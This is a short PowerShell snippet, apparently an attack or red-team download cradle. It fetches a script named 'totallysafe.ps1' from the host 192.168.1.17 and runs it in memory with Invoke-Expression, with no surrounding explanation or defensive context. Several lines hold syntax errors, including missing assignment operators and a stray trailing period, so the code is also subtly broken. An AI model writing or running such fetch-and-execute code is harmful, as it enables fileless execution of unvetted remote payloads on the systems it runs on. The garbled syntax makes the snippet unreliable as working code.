#URL of the script to download 
$scripturl = "http://192.168.1.17/totallysafe.ps1" 

# Download the script content 
$scriptBytes Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get -MaximumRedirection 0 
$scriptContent - [System.Text.Encoding]::UTF8.GetString($scriptBytes.Content) 

# Execute the script in memory 
Invoke-Expression -Command $scriptContent.